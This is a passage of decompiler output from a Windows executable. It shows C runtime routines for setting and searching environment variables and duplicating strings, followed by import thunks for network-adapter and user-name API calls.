    return 0xffffffff;
  }
  if (param_1 == pcVar1) {
    return 0xffffffff;
  }
  bVar6 = pcVar1[1] == '\0';
  if (DAT_0041231c == _DAT_00412320) {
    DAT_0041231c = (int *)FUN_0040c042(DAT_0041231c);
  }
  if (DAT_0041231c == (int *)0x0) {
    if ((param_2 == 0) || (DAT_00412324 == (undefined4 *)0x0)) {
      if (bVar6) {
        return 0;
      }
      DAT_0041231c = (int *)_malloc(4);
      if (DAT_0041231c == (int *)0x0) {
        return 0xffffffff;
      }
      *DAT_0041231c = 0;
      if (DAT_00412324 == (undefined4 *)0x0) {
        DAT_00412324 = (undefined4 *)_malloc(4);
        if (DAT_00412324 == (undefined4 *)0x0) {
          return 0xffffffff;
        }
        *DAT_00412324 = 0;
      }
    }
    else {
      iVar2 = FUN_0040b929();
      if (iVar2 != 0) {
        return 0xffffffff;
      }
    }
  }
  piVar3 = DAT_0041231c;
  iVar2 = FUN_0040bfea(param_1,(int)pcVar1 - (int)param_1);
  if ((iVar2 < 0) || (*piVar3 == 0)) {
    if (bVar6) {
      return 0;
    }
    if (iVar2 < 0) {
      iVar2 = -iVar2;
    }
    piVar3 = (int *)FUN_00405c08(piVar3,iVar2 * 4 + 8);
    if (piVar3 == (int *)0x0) {
      return 0xffffffff;
    }
    piVar3[iVar2] = (int)param_1;
    piVar3[iVar2 + 1] = 0;
  }
  else {
    if (!bVar6) {
      piVar3[iVar2] = (int)param_1;
      goto LAB_0040bf97;
    }
    piVar5 = piVar3 + iVar2;
    FUN_00404b0a(piVar3[iVar2]);
    for (; *piVar5 != 0; piVar5 = piVar5 + 1) {
      iVar2 = iVar2 + 1;
      *piVar5 = piVar5[1];
    }
    piVar3 = (int *)FUN_00405c08(piVar3,iVar2 << 2);
    if (piVar3 == (int *)0x0) goto LAB_0040bf97;
  }
  DAT_0041231c = piVar3;
LAB_0040bf97:
  if (param_2 != 0) {
    sVar4 = _strlen(param_1);
    _Dest = (char *)_malloc(sVar4 + 2);
    if (_Dest != (char *)0x0) {
      FID_conflict___mbscpy(_Dest,param_1);
      pcVar1[(int)_Dest - (int)param_1] = '\0';
      SetEnvironmentVariableA
                (_Dest,(LPCSTR)(~-(uint)bVar6 & (uint)(pcVar1 + ((int)_Dest - (int)param_1) + 1)));
      FUN_00404b0a(_Dest);
    }
  }
  return 0;
}



int FUN_0040bfea(uchar *param_1,size_t param_2)

{
  uchar *_Str2;
  int iVar1;
  uchar **ppuVar2;
  
  _Str2 = *DAT_0041231c;
  ppuVar2 = DAT_0041231c;
  while( true ) {
    if (_Str2 == (uchar *)0x0) {
      return -((int)ppuVar2 - (int)DAT_0041231c >> 2);
    }
    iVar1 = __mbsnbicoll(param_1,_Str2,param_2);
    if ((iVar1 == 0) && (((*ppuVar2)[param_2] == '=' || ((*ppuVar2)[param_2] == '\0')))) break;
    _Str2 = ppuVar2[1];
    ppuVar2 = ppuVar2 + 1;
  }
  return (int)ppuVar2 - (int)DAT_0041231c >> 2;
}



undefined4 * FUN_0040c042(int *param_1)

{
  int iVar1;
  int *piVar2;
  undefined4 *puVar3;
  undefined4 uVar4;
  int iVar5;
  undefined4 *puVar6;
  
  iVar5 = 0;
  if (param_1 != (int *)0x0) {
    iVar1 = *param_1;
    piVar2 = param_1;
    while (iVar1 != 0) {
      piVar2 = piVar2 + 1;
      iVar5 = iVar5 + 1;
      iVar1 = *piVar2;
    }
    puVar3 = (undefined4 *)_malloc(iVar5 * 4 + 4);
    if (puVar3 == (undefined4 *)0x0) {
      __amsg_exit(9);
    }
    iVar5 = *param_1;
    puVar6 = puVar3;
    while (iVar5 != 0) {
      param_1 = param_1 + 1;
      uVar4 = FUN_0040c11c(iVar5);
      *puVar6 = uVar4;
      puVar6 = puVar6 + 1;
      iVar5 = *param_1;
    }
    *puVar6 = 0;
    return puVar3;
  }
  return (undefined4 *)0x0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

byte * FUN_0040c0a9(byte *param_1,uint param_2)

{
  byte bVar1;
  uint uVar2;
  byte *pbVar3;
  
  if (_DAT_0041259c == 0) {
    pbVar3 = (byte *)FUN_004092f0(param_1,param_2);
    return pbVar3;
  }
  while( true ) {
    bVar1 = *param_1;
    uVar2 = (uint)bVar1;
    if (bVar1 == 0) break;
    if (((&DAT_004126a1)[uVar2] & 4) == 0) {
      pbVar3 = param_1;
      if (param_2 == uVar2) break;
    }
    else {
      pbVar3 = param_1 + 1;
      if (param_1[1] == 0) {
        return (byte *)0x0;
      }
      if (param_2 == CONCAT11(bVar1,param_1[1])) {
        return param_1;
      }
    }
    param_1 = pbVar3 + 1;
  }
  return (byte *)(~-(uint)(param_2 != uVar2) & (uint)param_1);
}



char * FUN_0040c11c(char *param_1)

{
  size_t sVar1;
  char *pcVar2;
  
  if (param_1 != (char *)0x0) {
    sVar1 = _strlen(param_1);
    pcVar2 = (char *)_malloc(sVar1 + 1);
    if (pcVar2 != (char *)0x0) {
      pcVar2 = FID_conflict___mbscpy(pcVar2,param_1);
      return pcVar2;
    }
  }
  return (char *)0x0;
}



void GetAdaptersInfo(void)

{
                    // WARNING: Could not recover jumptable at 0x0040c148. Too many branches
                    // WARNING: Treating indirect jump as call
  GetAdaptersInfo();
  return;
}



void GetUserNameExW(void)

{
                    // WARNING: Could not recover jumptable at 0x0040c14e. Too many branches
                    // WARNING: Treating indirect jump as call
  GetUserNameExW();
  return;
}



void RtlUnwind(PVOID TargetFrame,PVOID TargetIp,PEXCEPTION_RECORD ExceptionRecord,PVOID ReturnValue)

{
                    // WARNING: Could not recover jumptable at 0x0040c154. Too many branches
                    // WARNING: Treating indirect jump as call
  RtlUnwind(TargetFrame,TargetIp,ExceptionRecord,ReturnValue);
  return;
}



void Unwind_0040c160(void)

{
  FUN_00403880();
  return;
}



void Unwind_0040c180(void)

{
  FUN_00403880();
  return;
}


